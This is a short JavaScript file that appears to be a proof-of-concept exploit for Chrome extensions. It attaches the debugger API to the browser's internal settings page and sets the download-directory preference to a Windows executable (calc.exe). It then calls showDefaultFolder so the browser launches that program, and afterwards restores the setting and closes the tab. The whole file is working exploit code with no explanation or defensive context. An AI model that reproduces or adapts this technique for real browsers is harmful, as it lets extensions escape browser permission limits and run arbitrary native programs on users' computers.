targetId = null;

function sleep(milliseconds) {
	var start = new Date().getTime();
	for (;;) {
		if ((new Date().getTime() - start) > milliseconds)
			break;
	}
}

chrome.tabs.create({url: "about:settings-frame/settings"}, function (tab) {
	chrome.debugger.attach({tabId: tab.id}, "1.0", function () {
		sleep(1000);
		chrome.debugger.sendCommand({tabId: tab.id}, "Runtime.evaluate", {expression: 'old = document.getElementById("downloadLocationPath").value; chrome.send("setStringPref", ["download.default_directory", "c:\\\\windows\\\\system32\\\\calc.exe"]);'}, function (o) {
			sleep(100);
			chrome.downloads.showDefaultFolder();
			chrome.debugger.sendCommand({tabId: tab.id}, "Runtime.evaluate", {expression: 'chrome.send("setStringPref", ["download.default_directory", old]); window.close();'});
		});
	});
});
